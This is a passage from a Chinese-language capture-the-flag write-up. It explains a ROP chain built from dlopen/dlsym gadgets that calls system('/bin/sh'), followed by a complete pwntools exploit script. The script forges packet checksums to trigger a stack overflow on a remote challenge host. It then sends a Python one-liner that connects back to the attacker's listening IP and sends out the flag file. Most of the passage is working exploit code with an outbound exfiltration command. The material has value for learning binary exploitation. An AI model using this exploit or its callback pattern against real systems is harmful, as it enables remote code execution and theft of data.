然后就是 ROP，进入到 Launcher 时关掉了 stdout，所以就只能瞎打，所有的 gadgets
都要在 rroopp 里面找，发现存在 dlopen 和 dlsym，所以接下来的任务就是凑一个代码
执行了

首先用 add dword ptr [rax + 0x5b], ebx 把字符串放到全局数据区，然后依次调用
dlopen('libc.so.6', 2) 和 dlsym(libc_handle, 'system') 来获取 system
函数，同时注意到 main 函数中的 dlsym 执行完成之后直接调用了解析出来的函数
```
.text:0000000000400679                 mov     rdi, rax        ; handle
.text:000000000040067C                 call    _dlsym
.text:0000000000400681                 test    rax, rax
.text:0000000000400684                 jz      short loc_4006A9
.text:0000000000400686                 mov     edi, ebx
.text:0000000000400688                 pop     rbx
.text:0000000000400689                 mov     rsi, r12
.text:000000000040068C                 pop     r12
.text:000000000040068E                 pop     rbp
.text:000000000040068F                 jmp     rax
```

可以通过 r12 和 ebx 控制头两个参数，直接就调用 system('/bin/sh')，这样可以得到
一个没有回显的 shell，队友发现有 python，就直接反向连回来打印 flag 就行了

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" Himyth / AAA """
from pwn import *
import sys, os, re
context(arch='amd64', os='linux', log_level='info')
context(terminal=['gnome-terminal', '--', 'zsh', '-c'])

raddr, rport = '172.93.40.149', 5555
r = listen(bindaddr=raddr, port=rport)
p = remote('47.100.64.171', 20000)
p.sendlineafter('token\n', '79DC7rePzwA6MEC1dwoloOYpbP10IMzG')

gadgets = """
0x0000000000400758: pop rax; pop rbx; pop rbp; ret;
0x0000000000400757: add dword ptr [rax + 0x5b], ebx; pop rbp; ret;

0x00000000004007fb: mov esi, dword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30];
                    add rsp, 0x38; ret;
0x00000000004007f0: mov r12, qword ptr [rsp + 0x18]; mov r13, qword ptr [rsp + 0x20];
                    mov r14, qword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30];
                    add rsp, 0x38; ret;
0x0000000000400800: mov edi, dword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x0000000000400759: pop rbx; pop rbp; ret;

.text:0000000000400679                 mov     rdi, rax        ; handle
.text:000000000040067C                 call    _dlsym
.text:0000000000400681                 test    rax, rax
.text:0000000000400684                 jz      short loc_4006A9
.text:0000000000400686                 mov     edi, ebx
.text:0000000000400688                 pop     rbx
.text:0000000000400689                 mov     rsi, r12
.text:000000000040068C                 pop     r12
.text:000000000040068E                 pop     rbp
.text:000000000040068F                 jmp     rax
"""

pop_rax_rbx_rbp = 0x400758
add_dword_rax   = 0x400757

pop_esi = 0x4007fb
pop_r12 = 0x4007f0
pop_edi = 0x400800
pop_rbx = 0x400759

dlopen = 0x400630

dlsym_with_call = 0x400679
string_libc     = 0x400469
symbol_buffer   = 0x600d00

buffer_data = [0] * 0x100

pack    = lambda bytes: u32(flat(bytes, word_size=8))
unpack  = lambda n: map(ord, ('%08x' % n)[-8:].decode('hex')[::-1])

# store a string to symbol_buffer + offset
def make_string(s, offset=0):
    global rop
    if not s.endswith('\x00'): s += '\x00'

    for i in xrange(len(s)):
        addr = symbol_buffer + offset + i
        diff = (ord(s[i]) - (buffer_data[offset + i])) % 256
        rop += [
            pop_rax_rbx_rbp,
            addr - 0x5b,    # rax + 0x5b -> addr
            diff,           # rbx = char - buffer[i]
            0xdeadbeef,

            add_dword_rax,  # add dword ptr [rax + 0x5b], ebx
            0xdeadbeef,
        ]
        # update buffer data after "add dword ptr [rax + 0x5b], ebx"
        buffer_data[offset + i:offset + i + 4] = unpack(pack(
            buffer_data[offset + i:offset + i + 4]) + diff)

# call function "func" with args[0:2], 2 args only
def call_func(func, args):
    global rop
    make_string(func)   # save "func" string for dlsym
    rop += [
        pop_edi,
        0xdeadbeef, 0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef, 0xdeadbeef,
        string_libc,    # rdi -> 'libc.so.6'

        pop_esi,
        0xdeadbeef, 0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        2,              # rsi -> 2
        0xdeadbeef,

        dlopen,         # rax = dlopen('libc.so.6', 2)

        pop_rbx,
        args[0],        # rbx -> args[0]
        0xdeadbeef,

        pop_r12,
        0xdeadbeef, 0xdeadbeef, 0xdeadbeef,
        args[1],        # r12 -> argv[1]
        0xdeadbeef, 0xdeadbeef, 0xdeadbeef,

        pop_esi,
        0xdeadbeef, 0xdeadbeef, 0xdeadbeef,
        0xdeadbeef, 0xdeadbeef,
        symbol_buffer,  # rsi -> 'func'
        0xdeadbeef,

        dlsym_with_call,    # dlsym(handle, 'func')
                            # func(rbx(args[0]), r12(args[1]))
    ]

rop = []
make_string('/bin/sh\x00', offset=0x20)
call_func('system', [symbol_buffer + 0x20, 0])  # system('/bin/sh')
rops = flat(rop)

# calculate checksum
def checksum(data, length):
    sum = 0
    for i in xrange(length / 2):
        num = int(data[i * 2:i * 2 + 2][::-1].encode('hex'), 16)
        sum = (sum + num) % (2**32)
        if sum & (2**31):
            sum = ((sum & (2**16 - 1)) + (sum >> 16)) % (2**32)
    while (sum >> 16) != 0:
        sum = ((sum & (2**16 - 1)) + (sum >> 16)) % (2**32)
    return 2**16 - 1 - sum

# first package, trigger stack overflow
payload = p8(0x54)
payload += 'A' * 5
payload += p16(0x3048 | 0x02)   # 0x3048 return@LauncherMain, 2 non-fragmentation
payload += p8(1)                # valid
payload += p8(0x11)             # _0x11
payload += '\x00\x00'           # checksum placeholder
payload = payload.ljust(0x18, 'A')
payload += rops                 # package body data
payload = payload.replace('\x00\x00', p16(checksum(payload, 0x14)), 1)

print 'sending first package to trigger stack overflow'
p.send(p32(len(payload)))
p.send(payload)

# second package, trigger return at LauncherMain
payload = p8(0x54) + 'A'
payload += p16(0x10)        # total_length == body_length
payload += 'AA'
payload += p16(0x4)         # 4 last fragmenataion?
payload += p8(1)            # valid
payload += p8(0x11)         # _0x11
payload += '\x00\x00'       # checksum placeholder
payload = payload.ljust(0x18, 'A')
payload += 'A' * 0x10       # body, 0x10
payload = payload.replace('\x00\x00', p16(checksum(payload, 0x14)), 1)

print 'sending second package to trigger return@LauncherMain'
p.send(p32(len(payload)))
p.send(payload)

print 'sending reverse shell command to read the flag'
reverse_shell_command = """
python -c "import socket,subprocess;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('{}', {}));s.send(subprocess.check_output(['cat', 'flag']))"
""".format(raddr, rport).strip()
p.sendline(reverse_shell_command)

r.wait_for_connection()
print r.recv()
```
